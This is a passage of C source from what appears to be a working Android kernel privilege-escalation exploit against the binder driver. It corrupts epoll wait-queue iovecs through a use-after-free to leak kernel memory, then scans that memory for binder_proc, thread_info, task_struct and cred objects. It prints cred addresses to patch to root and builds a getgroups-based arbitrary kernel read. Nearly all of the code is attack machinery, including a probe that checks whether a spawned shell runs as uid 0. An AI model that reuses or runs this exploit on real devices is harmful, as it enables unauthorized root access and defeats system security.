        } else if (!strncmp(ln, "CapInh:", 7)) {
            sscanf(strchr(ln, ':') + 1, "%lx", &t->caps[0]);
            t->have_caps = 1;
        } else if (!strncmp(ln, "CapPrm:", 7))
            sscanf(strchr(ln, ':') + 1, "%lx", &t->caps[1]);
        else if (!strncmp(ln, "CapEff:", 7))
            sscanf(strchr(ln, ':') + 1, "%lx", &t->caps[2]);
        else if (!strncmp(ln, "CapBnd:", 7))
            sscanf(strchr(ln, ':') + 1, "%lx", &t->caps[3]);
    }
    return (t->have_ids && t->have_caps) ? 0 : -1;
}

static void hunt_creds(const char *stream, size_t got, unsigned long anchor_va, size_t anchor_off)
{
    struct cred_tmpl t;
    unsigned char want_ids[32], want_caps[32];
    size_t o, first = anchor_off + 0x4, n = 0;

    if (!anchor_va || read_tmpl(&t)) {
        printf("  hunt_creds: no template (self status unreadable) -- no verdict\n");
        return;
    }
    memcpy(want_ids, t.ids, sizeof want_ids);
    memcpy(want_caps, t.caps, sizeof want_caps);
    printf("  hunt_creds: template uid=%u gid=%u euid=%u caps=%lx/%lx/%lx/%lx\n",
           t.ids[0], t.ids[1], t.ids[2], t.caps[0], t.caps[1], t.caps[2], t.caps[3]);

    for (o = first; o + 0x44 <= got; o += 1) {
        if (memcmp(stream + o, want_ids, 32) || memcmp(stream + o + 0x24, want_caps, 32))
            continue;
        printf("  CRED base=%#lx (ids@+%#x caps@+%#x)\n",
               anchor_va + ((long)o - 4 - (long)anchor_off), 0x4, 0x28);
        printf("    PATCH 32B zeros -> %#x ; 32B ones -> %#x ; REVERT is the same 64 bytes\n",
               0x4, 0x28);
        if (++n > 8)
            break;
    }
    printf("  hunt_creds: %zu cred-shaped object(s) in the window\n", n);
}

/* Two structural needles, both needing no guessed constant (ledger 485: poc98 takes
 * current from a FIXED offset of the leak; ours must be *found*, so use the shape that
 * only these two objects have):
 *   thread_info (arm64 3.18, at the 16 KiB-aligned kernel-stack base):
 *     +0x08 addr_limit.seg   (+0x10 task)   (+0x50 preempt_count) (+0x54 cpu)
 *     -- all four witnessed: strncpy_from_user+0x18, override_creds+0x18 & binder_open+0x88,
 *        binder_open+0xdc, __request_module's cpumask test.
 *     predicate: T 16 KiB-aligned, q(T+0x10) a kernel VA, [T+0x54] < 8 (cpu), [T+0x50] small.
 *   binder_proc (kmalloc-512, same queue as our freed slot): pid at +0x30, tsk at +0x48,
 *     default_priority at +0x1d0 -- all three witnessed inside binder_open (`ldr x0,[x1,#0x10]`
 *     -> `str x0,[x19,#0x48]`; `ldr w20,[x0,#0x54]` -> `sub w20,#0x78` -> `str x20,[x19,#0x1d0]`).
 *
 * Why the selector is a PLANTED VALUE and not a shape: ledger 489/490 measured that "pid@+0x30 ==
 * my pid" plus self-referential list heads is only ~12 bytes of constraint, and this cache is full
 * of objects satisfying it (binder_thread also has an int pid and todo/wait heads).  Shape
 * statistics are not identity.  So this process sets its own nice to NICE *before* opening any
 * /dev/binder fd -- the kernel then stores that chosen number in every binder_proc of ours -- and
 * BPFDS extra opens put several real procs of THIS task in the same cache.  A candidate counts only
 * with our pid, our planted nice AND AGREEMENT: two distinct candidates handing back the same tsk.
 * The last step is still a user-side proof taken before any cred is touched: the driver writes a
 * foreign static_prio into the candidate and we read /proc/self/stat back (see self_prio()). */
static void scan_sigs(const char *stream, size_t got, unsigned long anchor_va, size_t anchor_off)
{
    size_t o;
    int ti = 0, ti_user = 0, ti_kern = 0, ti_shape = 0, pr = 0, rej = 0;
    int i, besti = -1, best = 0, nacc = 0;
    unsigned int mypid = (unsigned int)getpid();
    unsigned int wantpid;
    unsigned int target = g_wantpid ? g_wantpid : mypid;
    long nice_now = g_wantpid ? g_wantnice : getpriority(PRIO_PROCESS, 0);
    /* Agreement is accumulated across rounds, deliberately: every round leaks a window around the
     * slot that round's iovec copy landed in, so two rounds give two independent looks at the slab
     * neighbourhood.  What still has to be satisfied is DISTINCT candidates (two different objects)
     * naming the same tsk -- the same proc read twice in two rounds is consistency, not multiplicity,
     * and is not counted. */
    /* Every USER_DS/KERNEL_DS thread_info shape we have ever seen this process, kept across rounds
     * for one question only: does the window ever contain the stack of the task the needle just
     * named?  That is the precondition of the addr_limit route (poc98's kernel read), and §486
     * measured a flat no for the holder's own stack in an 8 MB window -- so this is a fact to
     * re-measure per target, not to assume either way. */
    static struct { unsigned long t, task; int user; } ticand[256];
    static int nticand;

    if (!anchor_va)
        return;
    wantpid = target + (getenv("NEGPID") ? (unsigned int)atoi(getenv("NEGPID")) : 0);
    printf("  scan_sigs: want pid=%u%s  default_priority=%ld at +%#x  (target %s)\n", wantpid,
           wantpid == target ? "" : "   <== NEGATIVE CONTROL, no live task has this pid>",
           nice_now, PROC_DEFPRIO, g_wantpid ? "is the WCHILD" : "is this process");
    if (wantpid == target && nice_now == 0)
        printf("    WARNING: nice==0, so the +0x1d0 test carries no information -- run with NICE\n");
    for (o = anchor_off; o + PROC_DEFPRIO + 8 <= got; o += 8) {
        unsigned long va = anchor_va + ((long)o - (long)anchor_off);
        unsigned long task, seg, pc_cpu, dp, tsk;
        unsigned int cpu, pid;
        int k, pairs = 0;

        if (va % 8)
            continue;

        memcpy(&seg, stream + o + 0x08, 8);
        memcpy(&task, stream + o + 0x10, 8);
        memcpy(&pc_cpu, stream + o + 0x50, 8);     /* two ints: preempt_count then cpu */
        cpu = (unsigned int)(pc_cpu >> 32);
        if ((va & 0x3fffUL) == 0 && plaus_krn(task) && task % 8 == 0 && cpu < 8) {
            /* §486: the shape predicate alone also accepts empty list heads whose "+0x10" is just
             * another self-pointer.  addr_limit is one of exactly two values, so demand it:
             * 0x8000000000 == USER_DS (a user task) / 0xffffffffffffffff == KERNEL_DS (a kthread). */
            int is_user = (seg == 0x8000000000UL), is_kern = (seg == 0xffffffffffffffffUL);
            if (!is_user && !is_kern) {
                ti_shape++;
                continue;
            }
            if (++ti <= 6)
                printf("  THREAD_INFO cand T=%#lx  +08(seg)=%#lx %s +10(task)=%#lx +50(preempt)=%#x cpu=%u\n",
                       va, seg, is_user ? "USER_DS" : "KERNEL_DS", task, (unsigned int)pc_cpu, cpu);
            ti_user += is_user;
            ti_kern += is_kern;
            if (nticand < 256) {
                ticand[nticand].t = va;
                ticand[nticand].task = task;
                ticand[nticand].user = is_user;
                nticand++;
            }
        }

        memcpy(&pid, stream + o + PROC_PID, 4);
        memcpy(&dp, stream + o + PROC_DEFPRIO, 8);
        {
            int q, hit = -1;

            for (q = 0; q < nplant; q++)
                if (g_plant[q].pid == pid && (unsigned long)g_plant[q].nice == dp) {
                    hit = q;
                    break;
                }
            /* The negative-control run keeps its own single-pair test: with NEGPID set the planted
             * table is irrelevant, and what must fail is exactly "a pid nobody has". */
            if (wantpid != (unsigned int)getpid())
                hit = (pid == wantpid && dp == (unsigned long)nice_now) ? 0 : -1;
            if (hit < 0) {
                if (pid == wantpid)
                    rej++;
                continue;
            }
        }
        memcpy(&tsk, stream + o + PROC_TSK, 8);
        for (k = 0; k + 0x10 <= 0x200 && o + k + 0x10 <= got; k += 8) {
            unsigned long a, b;
            memcpy(&a, stream + o + k, 8);
            memcpy(&b, stream + o + k + 8, 8);
            if (a == va + k && b == va + k)
                pairs++;
        }
        /* The planted numbers first: a candidate must carry OUR chosen pid AND OUR chosen nice.
         * The list-head count is only reported, never used to reject -- §490 showed shapes here
         * are shared by binder_thread and other objects, so they identify nothing. */
        if (!plaus_krn(tsk)) {
            rej++;
            continue;
        }
        printf("  PROC cand=%#lx pid@+%#x=%u prio@+%#x=%ld tsk@+%#x=%#lx self_list_heads=%d\n",
               va, PROC_PID, pid, PROC_DEFPRIO, (long)dp, PROC_TSK, tsk, pairs);
        printf("    PATCH task=%#lx cred=%#lx real_cred=%#lx prio_field=%#lx\n",
               tsk, tsk + TASK_CRED, tsk + TASK_REALCRED, tsk + TASK_PRIO);
        {
            int s;

            for (s = 0; s < nseen; s++)
                if (seen[s].tsk == tsk)
                    break;
            if (s == nseen && nseen < 48) {
                seen[s].tsk = tsk;
                seen[s].pid = pid;
                nseen++;
            }
            if (s < nseen) {
                int c, dup = 0;

                for (c = 0; c < seen[s].n; c++)
                    if (seen[s].cand[c] == va)
                        dup = 1;
                if (!dup && seen[s].n < 8)
                    seen[s].cand[seen[s].n++] = va;
            }
        }
        if (++nacc > 64)
            printf("    (candidate list full)\n");
        if (++pr > 12)
            printf("    (more accepted candidates suppressed)\n");
    }
    printf("  scan_sigs: thread_info %d (USER_DS %d, KERNEL_DS %d), %d rejected by the addr_limit test, "
           "%d proc accepted, %d pid-matches rejected by the planted values\n",
           ti, ti_user, ti_kern, ti_shape, pr, rej);

    /* AGREEMENT, the part we manufactured: our own binder_procs all store the same ->tsk, so two
     * distinct objects naming the same task is what binder_open does for one process -- not a shape
     * that happens to recur.  One candidate alone is never published. */
    for (i = 0; i < nseen; i++) {
        if (seen[i].n > best) {
            best = seen[i].n;
            besti = i;
        }
        printf("  tsk %#lx: named by %d distinct binder_proc candidate(s)%s\n", seen[i].tsk, seen[i].n,
               seen[i].n > 1 ? "   <== AGREEMENT" : "");
    }
    {
        int t, s, nm = 0;

        for (t = 0; t < nticand; t++)
            for (s = 0; s < nseen; s++)
                if (ticand[t].task == seen[s].tsk) {
                    printf("  TI_MATCH T=%#lx names the target task %#lx (USER_DS=%d) -> the addr_limit route has an anchor\n",
                           ticand[t].t, ticand[t].task, ticand[t].user);
                    printf("  TIVA=%#lx\n", ticand[t].t);
                    nm++;
                }
        printf("  thread_info shapes kept: %d, of which naming our target task: %d\n", nticand, nm);
    }

    if (wantpid != target) {
        printf("  NEGCTRL: accepted %d with a pid nobody has -> %s\n", nacc,
               nacc == 0 ? "needle is sharp" : "NEEDLE IS BLIND (a nonexistent pid still hits)");
        return;
    }
    if (best >= 2) {
        printf("  TASKVA=%#lx pid=%u agreement=%d cred=%#lx real_cred=%#lx prio=%#lx\n",
               seen[besti].tsk, seen[besti].pid, best, seen[besti].tsk + TASK_CRED,
               seen[besti].tsk + TASK_REALCRED, seen[besti].tsk + TASK_PRIO);
        g_taskva = seen[besti].tsk;
    }
    else
        printf("  TASKVA=  (no agreement yet: %s -> nothing published)\n",
               best ? "one candidate per tsk so far, add rounds" : "no candidate accepted");
}

/* The task the needle named is *the* thing we need to read, and the leak window already carries
 * raw bytes from a wide address band -- rounds have anchored at 0xffffffc053.., 0xffffffc086..,
 * 0xffffffc0a6.., 0xffffffc0b0.., 0xffffffc115.., 0xffffffc16e.., so with enough rounds some
 * window covers the target task_struct.  When it does, the same bytes give us
 * `task->pid`/`static_prio`/`cred`/`real_cred` with NO new primitive -- and `pid` is the
 * known-answer calibration of the whole read: if the window position were mistranslated, the pid
 * would not be the pid we planted.  §491 measured that neither our own thread_info (209 shapes
 * kept, 0 naming our task) nor any cred-shaped object appears, so this is the only read channel
 * the geometry leaves. */
static void read_target(const char *stream, size_t got, unsigned long anchor_va, size_t anchor_off)
{
    unsigned long end = anchor_va + (got - anchor_off);
    struct cred_tmpl t;
    size_t o;
    unsigned long cred, rcred;
    unsigned int pid;
    int prio, i;

    int j, covered = 0;

    if (!nseen || !anchor_va) {
        printf("  read_target: nothing named yet (or no window anchor) -- nothing to read\n");
        return;
    }
    for (j = 0; j < nseen; j++)
        if (seen[j].tsk >= anchor_va && seen[j].tsk + TASK_REALCRED + 8 <= end)
            break;
    if (j == nseen) {
        printf("  read_target: %d named task(s), none inside this window [%#lx,%#lx)\n",
               nseen, anchor_va, end);
        return;
    }
    g_taskva = seen[j].tsk;
    g_wantpid = seen[j].pid;
    covered = 1;
    (void)covered;
    o = anchor_off + (g_taskva - anchor_va);
    memcpy(&pid, stream + o + TASK_PID, 4);
    memcpy(&prio, stream + o + TASK_PRIO, 4);
    memcpy(&cred, stream + o + TASK_CRED, 8);
    memcpy(&rcred, stream + o + TASK_REALCRED, 8);
    printf("  READ task=%#lx pid@+%#x=%u static_prio@+%#x=%d cred@+%#x=%#lx real_cred@+%#x=%#lx\n",
           g_taskva, TASK_PID, pid, TASK_PRIO, prio, TASK_CRED, cred, TASK_REALCRED, rcred);
    /* calibration first: a read that cannot return the pid we planted is not a read */
    if (pid != g_wantpid) {
        printf("    MISMATCH: window says pid=%u but the needle's target is pid=%u -> the anchor\n"
               "      translation is wrong, so NOTHING here is usable as a reading\n", pid, g_wantpid);
        return;
    }
    printf("  TASKCOVERED=1\n");
    if (read_tmpl(&t)) {
        printf("    (no self template, cannot judge the cred bytes)\n");
        return;
    }
    if (cred < anchor_va || cred + 0x48 > end) {
        printf("    cred %#lx is outside this window (real_cred %#lx) -- read the task, not the cred\n",
               cred, rcred);
        if (rcred == cred)
            printf("    (cred == real_cred: the task has not overridden its creds)\n");
        return;
    }
    o = anchor_off + (cred - anchor_va);
    printf("  READ cred=%#lx ids+caps:", cred);
    for (i = 0; i < 8; i++) {
        unsigned int v;
        memcpy(&v, stream + o + 0x04 + 4 * i, 4);
        printf(" %u", v);
    }
    for (i = 0; i < 4; i++) {
        unsigned long v;
        memcpy(&v, stream + o + 0x28 + 8 * i, 8);
        printf(" cap=%lx", v);
    }
    printf("\n");
    printf("    template(uid=%u gid=%u euid=%u caps=%lx/%lx/%lx/%lx) -> match=%s\n",
           t.ids[0], t.ids[1], t.ids[2], t.caps[0], t.caps[1], t.caps[2], t.caps[3],
           (!memcmp(stream + o + 0x04, t.ids, 32) && !memcmp(stream + o + 0x24 + 4, t.caps, 32))
               ? "OURS" : "NOT ours");
    printf("  CREDVA=%#lx\n", cred);
}

/* The stronger read channel: instead of naming a task through a binder_proc and then hoping a later
 * window covers it, look for the identity INSIDE the window -- a position whose int at +0x490 is one
 * of OUR children's pids, whose int at +0x54 is that same child's planted static_prio, and whose
 * two cred pointers (+0x4c0/+0x658) are equal and plausible.  Three values chosen or known by us,
 * read out of the object itself: that is identity, not the shape statistics §490 forbade.  And when
 * it hits, `q(+0x4c0)` is the cred address the in-place patch needs. */
static void hunt_task_in_window(const char *stream, size_t got, unsigned long anchor_va, size_t anchor_off)
{
    size_t o;
    int shown = 0, hits = 0, c_pid = 0, c_prio = 0, c_cred = 0;

    if (!anchor_va || !nplant)
        return;
    for (o = anchor_off + TASK_PID; o + (TASK_REALCRED - TASK_PID) + 8 <= got; o += 4) {
        unsigned long va = anchor_va + ((long)o - (long)anchor_off);
        unsigned long base_va = va - TASK_PID;
        long bo = (long)o - (long)anchor_off;          /* index into stream of the pid field */
        unsigned int pid;
        int prio, k;
        unsigned long cred, rcred;

        if (base_va % 8)
            continue;
        memcpy(&pid, stream + o, 4);
        for (k = 0; k < nplant; k++)
            if (g_plant[k].pid == pid)
                break;
        if (k == nplant)
            continue;
        c_pid++;                       /* a known pid word at a task-shaped position: the only
                                        * evidence that a task_struct is in this window at all */
        memcpy(&prio, stream + bo - TASK_PID + TASK_PRIO, 4);
        if (prio != 120 + (int)g_plant[k].nice)
            continue;
        c_prio++;
        memcpy(&cred, stream + bo - TASK_PID + TASK_CRED, 8);
        memcpy(&rcred, stream + bo - TASK_PID + TASK_REALCRED, 8);
        if (!plaus_krn(cred) || cred != rcred)
            continue;
        c_cred++;
        hits++;
        if (++shown <= 12)
            printf("  TASKINWINDOW base=%#lx pid=%u static_prio=%d cred=%#lx (== real_cred)\n",
                   base_va, pid, prio, cred);
    }
    /* Staged counts, so a zero is an answer rather than a blind ruler: c_pid says whether ANY of
     * our task_structs is in this window, c_prio/c_cred say whether the rest of the conjunction
     * then holds. */
    printf("  hunt_task_in_window: pid-hits=%d prio-hits=%d cred-hits=%d accepted=%d\n",
           c_pid, c_prio, c_cred, hits);
    if (hits)
        printf("  TWIN=%d\n", hits);
}

static void report_window(const char *stream, size_t got)
{
    unsigned long s = 0;
    size_t w = (size_t)-1;

    if (find_pair(stream, got, &w, &s))
        w = (size_t)-1;
    if (w == (size_t)-1) {
        /* Fallback: seg4's iov_len IS the corrupted lock value, so the window's
         * expected offset is 0x1000 + that value.  Show what is really there. */
        unsigned long locklen = 0, e1 = 0, e2 = 0;
        size_t exp;
        printf("  window: no paired pointer; ");
        if (got > 0x1008) memcpy(&locklen, stream + 0x1000, 8);
        exp = 0x1000 + (size_t)locklen;
        printf("lock@+0x1000=%#lx -> expected window+%zu\n", locklen, exp);
        if (exp + 64 <= got) {
            int k;
            for (k = 0; k < 8; k++) {
                unsigned long v;
                memcpy(&v, stream + exp + k * 8, 8);
                if (k == 0) e1 = v;
                if (k == 1) e2 = v;
                printf("      +%02d %#018lx%s\n", k * 8, v,
                       (v >= 0xffffffc000000000UL && v < 0xffffffd000000000UL)
                       ? "   <== linear map" : "");
            }
            if (e1 >= 0xffffffc000000000UL && e1 < 0xffffffd000000000UL &&
                (e1 - 0x50) % 512 == 0)
                printf("      single-pointer hit: slotVA=%#lx (paired=%s)\n",
                       e1 - 0x50, e1 == e2 ? "yes" : "no");
        } else {
            printf("      (delivered only %zu bytes: window never arrived)\n", got);
        }
        return;
    }
    {
        char where[96];

        if (plaus_lin(s))
            snprintf(where, sizeof where, "phys=%#lx (%.2f GB above RAM base 0x40000000)",
                     s - LIN_LO, (double)(s - LIN_LO) / 1073741824.0);
        else
            snprintf(where, sizeof where,
                     "NOT in the linear map (%#lx): no phys reading", s);
        printf("  window: S=%#lx at stream+%zu  slotVA=%#lx  page=%#lx  %s\n",
               s, w, s - 0x50, s & ~0xfffUL, where);
    }
    {
        const char *needle = getenv("FIND");
        const char *pc = getenv("PCTRL");
        if (needle && *needle)
            find_needle(stream, got, needle, s, w, "kernel");
        if (pc && *pc)
            find_needle(stream, got, pc, s, w, "pctrl");
        if (getenv("HUNT"))
            hunt_tasks(stream, got, s, w);
        if (getenv("CRED"))
            hunt_creds(stream, got, s, w);
        if (getenv("SIG"))
            scan_sigs(stream, got, s, w);
        if (getenv("READ"))
            read_target(stream, got, s, w);
        if (getenv("TWIN"))
            hunt_task_in_window(stream, got, s, w);
    }

    /* Map the objects we can actually see: a free object's first word is SLUB's
     * next pointer, which for these caches sits at offset 0 (no SLUB debug on this
     * build).  Print each 512-aligned address and label it. */
    {
        unsigned long page = s & ~0xfffUL;
        unsigned long o;
        int nf = 0, nl = 0;
        for (o = page; o < page + 0x1000; o += 512) {
            long off = (long)o - (long)s;
            unsigned long v;
            if (off < 0 || (size_t)off + 8 > got - w) continue;
            memcpy(&v, stream + w + off, 8);
            if (v >= page && v < page + 0x1000 && v % 512 == 0) {
                printf("    obj %#lx: next=%#lx  <-- FREE (offset 0 confirmed)\n", o, v);
                nf++;
            } else {
                nl++;
            }
        }
        printf("    visible objects: %d live/other, %d with an in-page next pointer\n", nl, nf);
    }
}

/* One attempt: returns delivered byte count, fills stream[] */
static int xep[16];
static int nxep;
static int attempt(int epfd, char *fill, char *stream, size_t *out_len, size_t cap, size_t span)
{
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct epoll_event ev = { .events = EPOLLIN };
    int pipefd[2] = { -1, -1 }, leakPipe[2] = { -1, -1 };
    size_t total = 0;
    int j, fd, rc = -1;
    pid_t pid;
    ssize_t b;
    void *map;

    nxep = 0;
    fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
    if (fd < 0) { perror("open binder"); return -1; }
    /* binder_mmap() refuses writable mappings on this build (EPERM); Android clients
     * only ever map it PROT_READ|MAP_SHARED, and the outgoing parcel is read from
     * ordinary user memory, so a read-only map is enough to give proc->alloc a pool. */
    map = mmap(NULL, TX_MAP, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap binder"); close(fd); return -1; }

    /* Full-coverage instrumentation, with one exception: slot 0x48 IS iovec[4].iov_len
     * and that is the wait queue's ticket spinlock (head in the low 16 bits, tail in
     * the high 16 -- proven by this round: setting it to 0x1000 made head != tail, so
     * remove_wait_queue()'s spin_lock_irqsave spun forever).  It must start at 0
     * (= unlocked); after one lock/unlock cycle the kernel leaves 0x00010001 there,
     * which is why poc98 calls it UAF_SPINLOCK. */
    memset(iov, 0, sizeof iov);
    iov[WQ - 1].iov_base = fill + (WQ - 1) * BLK; iov[WQ - 1].iov_len = 0x1000;
    iov[WQ].iov_base     = fill + WQ * BLK;       iov[WQ].iov_len = 0;        /* the spinlock */
    iov[WQ + 1].iov_base = fill + (WQ + 1) * BLK; iov[WQ + 1].iov_len = span; /* the leak window */
    iov[WQ + 2].iov_base = fill + (WQ + 2) * BLK; iov[WQ + 2].iov_len = UAF_SPINLOCK;
    for (j = 0; j < IOVEC_ARRAY_SZ; j++)
        total += iov[j].iov_len;

    if (arm_pending_tx(fd, map)) goto out;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("epoll_add"); goto out; }
    /* Extra waiters on the SAME wait head, so the child's single unlink leaves `next`
     * pointing at another eppoll_entry inside that slab page: readv's base then lands in
     * the ep-poll cache, where each neighbouring entry's wait.private == our task_struct.
     * (With only one waiter the unlink is the self-pointer case -> we just read back our
     * own iovec copy, which is what every earlier round actually delivered.) */
    {
        const char *e = getenv("XEPOLL");
        int want = e ? atoi(e) : 0, k;   /* default 0 = the proven single-waiter geometry (clobber depends on it) */
        for (k = 0; k < want; k++) {
            int x = epoll_create(8);
            if (x < 0) { perror("epoll_create x"); break; }
            /* binder_poll only reaches poll_wait() while has_thread_work() is false;
             * the previous ADD's own read/return_error bookkeeping can flip that, so
             * re-arm the exact pending state (sync txn out, TRANSACTION_COMPLETE
             * consumed, REPLY untouched) before every registration. */
            if (arm_pending_tx(fd, map)) { printf("  re-arm failed at %d\n", k); close(x); break; }
            if (epoll_ctl(x, EPOLL_CTL_ADD, fd, &ev)) { perror("epoll_add x"); close(x); break; }
            xep[nxep++] = x;
        }
        printf("  extra waiters registered on the same head: %d\n", nxep);
    }
    if (pipe(pipefd) || pipe(leakPipe)) { perror("pipe"); goto out; }
    j = fcntl(pipefd[0], F_SETPIPE_SZ, PAGE);
    printf("  pipefd size=%d\n", j);
    j = fcntl(leakPipe[1], F_SETPIPE_SZ, 0x20000);
    printf("  leakPipe size=%d errno=%d\n", j, errno);
    if (j < 0 && errno != EINVAL) { perror("F_SETPIPE_SZ"); goto out; }

    pid = fork();
    if (pid < 0) { perror("fork"); goto out; }
    if (pid == 0) {
        size_t got = 0;
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(pipefd[1]);
        close(leakPipe[0]);
        sleep(1);
        printf("CHILD: DEL now\n");
        alarm(4);            /* a spin inside remove_wait_queue must not wedge CPU0 */
        {
            const char *d = getenv("DELI");
            int di = d ? atoi(d) : -1;   /* -1 = the original epfd; >=0 = one of xep[] */
            int del_fd = (di >= 0 && di < nxep) ? xep[di] : epfd;
            printf("CHILD: DEL from %d (deli=%d, nxep=%d)\n", del_fd, di, nxep);
            if (epoll_ctl(del_fd, EPOLL_CTL_DEL, fd, &ev)) { perror("child epoll_del"); _exit(10); }
        }
        alarm(0);
        printf("CHILD: DEL returned\n");
        got = read_loop(pipefd[0], stream, cap);
        close(pipefd[0]);
        close(fd);
        printf("CHILD: drained %zu\n", got);
        write_loop(leakPipe[1], stream, got);
        close(leakPipe[1]);
        _exit(0);
    }
    close(pipefd[0]);
    close(leakPipe[1]);
    leakPipe[1] = -1;

    dump_threads("pre-exit");
    /* the guard is against a spin inside remove_wait_queue wedging CPU0, but it also has to
     * allow the pipe drain: at 1 MB it expired nowhere near the transfer, so scale it */
    alarm(60 + span / 0x40000);
    errno = 0;
    if (ioctl(fd, BINDER_THREAD_EXIT, NULL)) { perror("BINDER_THREAD_EXIT"); goto out; }
    b = writev(pipefd[1], iov, IOVEC_ARRAY_SZ);
    printf("  writev -> %zd (expect %zu) errno=%d\n", b, total, errno);
    close(pipefd[1]);
    *out_len = read_loop(leakPipe[0], stream, cap);
    alarm(0);
    {
        int st = 0;
        waitpid(pid, &st, 0);
        printf("  delivered %zu bytes, child status=%d\n", *out_len, st);
    }
    dump_threads("post");
    rc = 0;
out:
    if (map != MAP_FAILED)
        munmap(map, TX_MAP);
    if (rc) {
        if (leakPipe[0] >= 0) close(leakPipe[0]);
        if (leakPipe[1] >= 0) close(leakPipe[1]);
        if (pipefd[1] >= 0) close(pipefd[1]);
    }
    if (fd >= 0) close(fd);
    return rc;
}

/* The cred patch is fired by a *different* process (clobber), so the witness must not come
 * from the writer.  With HOLD=sec this process prints the cred-derived state it would show
 * the kernel (getuid + /proc/self/status, which proc_pid_status reads out of real_cred),
 * sleeps while the driver writes, then prints it again.  Note /proc/<pid>/status of a rooted
 * process is NOT readable by uid 2000, so an outside reader cannot supply this proof. */
static void show_creds(const char *phase)
{
    char buf[4096];
    int fd, n;

    printf("  %s: getuid=%d geteuid=%d getgid=%d\n", phase,
           (int)getuid(), (int)geteuid(), (int)getgid());
    fd = open("/proc/self/status", O_RDONLY);
    if (fd < 0) {
        printf("  %s: /proc/self status unreadable errno=%d\n", phase, errno);
        return;
    }
    n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n > 0) {
        char *ln;
        buf[n] = 0;
        for (ln = strtok(buf, "\n"); ln; ln = strtok(NULL, "\n"))
            if (!strncmp(ln, "Name:", 5) || !strncmp(ln, "Uid:", 4) ||
                !strncmp(ln, "Gid:", 4) || !strncmp(ln, "CapEff:", 7) ||
                !strncmp(ln, "CapBnd:", 7))
                printf("  %s:   %s\n", phase, ln);
    }
}

/* One probe: fork a child that really runs execve and report the cred the kernel gave it.  This is
 * the witness ledger 487/489 still owed -- "a fresh execve carries uid 0", not just "getuid() lies".
 * The child also writes its reading to a file the driver can pull independently, and it reports its
 * own wait status here: the holder once vanished between "SELFUID=0" and the next line, and without
 * the child's status that leaves two stories (the exec killed the child, or the parent died) untold.
 * alarm(10) is in the child because a hung sh would otherwise wedge the parent in waitpid forever. */
static void exec_probe(int iter)
{
    pid_t k = fork();
    int st = 0;

    if (k == 0) {
        alarm(10);
        execl("/system/bin/sh", "sh", "-c",
              "rm -f /data/local/tmp/probe.uid; "
              "{ id -u; grep -m1 CapEff /proc/self/status; ls -ld /proc/$$/; } "
              "> /data/local/tmp/probe.uid 2>&1; chmod 666 /data/local/tmp/probe.uid; "
              "echo PROBE uid=$(id -u) cap=$(grep -m1 CapEff /proc/self/status)",
              (char *)0);
        _exit(127);
    }
    if (k < 0) {
        printf("  probe fork failed errno=%d\n", errno);
        return;
    }
    waitpid(k, &st, 0);
    /* Reap anything else, including the WCHILD: its exit status is what separates "the child called
     * _exit after execl failed" (exited=127) from "something killed it" (signalled, signal N). */
    {
        pid_t r;
        int rst = 0;

        while ((r = waitpid(-1, &rst, WNOHANG)) > 0)
            printf("  reaped pid=%d status=%d exited=%d code=%d signalled=%d sig=%d\n", r, rst,
                   WIFEXITED(rst), WIFEXITED(rst) ? WEXITSTATUS(rst) : -1, WIFSIGNALED(rst),
                   WIFSIGNALED(rst) ? WTERMSIG(rst) : 0);
        fflush(stdout);
    }
    printf("  probe %d: child status=%d exited=%d signalled=%d sig=%d parent_uid_now=%d\n", iter, st,
           WIFEXITED(st), WIFSIGNALED(st), WIFSIGNALED(st) ? WTERMSIG(st) : 0, (int)getuid());
    fflush(stdout);
}

/* GRP=<ngroups> -- the READ channel.  SyS_getgroups as it is actually shipped in this Image
 * (tools/ksdis.py SyS_getgroups, offsets re-decoded per run) is
 *   ldr x3,[task,#0x4c0]   cred
 *   ldr x6,[x3,#0x88]      cred->group_info
 *   ldr w2,[x6,#4]         group_info->ngroups
 *   ldr x4,[x6,#0x90+8*i]  group_info->blocks[i/1024]   <- a KERNEL pointer
 *   ldr w3,[x4,#4*(i%1024)]   str w3,[userbuf]
 * so the gid values are read *through a pointer that lives inside the group_info*.  A group_info
 * sitting at an address we know -- with only `ngroups` and `blocks[0]` written by the same arbitrary
 * write -- therefore turns our own getgroups() into a 4-bytes-at-a-time read of any kernel address:
 * no leak-window coverage, no addr_limit anchor, and nothing from the kill set (it allocates no
 * struct file and copies no cred).  This path touches cred+0x88 and nothing else of the crafted
 * cred, which is why the read phase cannot oops the way the impersonation experiments did.
 */
/* Raw channel for the borrowed-credential phase.  Nothing in this loop may touch stdio, allocate,
 * grow the heap or open anything: §492 measured which syscalls a task answering through a borrowed
 * kernel-domain credential survives (getgroups, prctl, getuid, getpriority, write on a descriptor it
 * opened BEFORE the swap, nanosleep) and printf's buffer growth / brk is not on that list.  So the
 * read phase reports through this fd only, and the driver counts *this* file to tell "the holder is
 * still sampling" apart from "the write did not land" -- which §505/506 kept confusing. */
static int q_fsuid(void) { return (int)syscall(SYS_setfsuid, (uid_t)-1); }
static int q_fsgid(void) { return (int)syscall(SYS_setfsgid, (gid_t)-1); }

static int gfd = -1;

static void graw(const char *fmt, ...);

static void sigmark(int signo)
{
    graw("M SIGNAL %d (exit code will be %d)\n", signo, 90 + signo);
    _exit(90 + signo);
}

static int lfd = -1;

/* The ladder's own channel: raw write(), no stdio buffer.  Run 26 proved why -- everything the
 * rooted task printed after "L0" is gone from the redirected stdout while rb.sh still reported
 * EXIT=0, so "which step was last" could not be read off the log.  A line that reaches this fd is
 * a line that was printed before the task vanished. */
static void lad(const char *fmt, ...)
{
    char b[640];
    va_list ap;
    int n;

    if (lfd < 0)
        return;
    va_start(ap, fmt);
    n = vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);
    if (n > 0) {
        if (n >= (int)sizeof b)
            n = sizeof b - 1;
        if (write(lfd, b, n) < 0)
            lfd = -1;
    }
}

static void graw(const char *fmt, ...)
{
    char b[640];
    va_list ap;
    int n;

    if (gfd < 0)
        return;
    va_start(ap, fmt);
    n = vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);
    if (n > 0) {
        if (n >= (int)sizeof b)
            n = sizeof b - 1;
        if (write(gfd, b, n) < 0)
            gfd = -1;	/* the channel itself failed -- say so by the absence of lines */
    }
}

static void grp_raw(int want)
{
    gid_t gb[64];
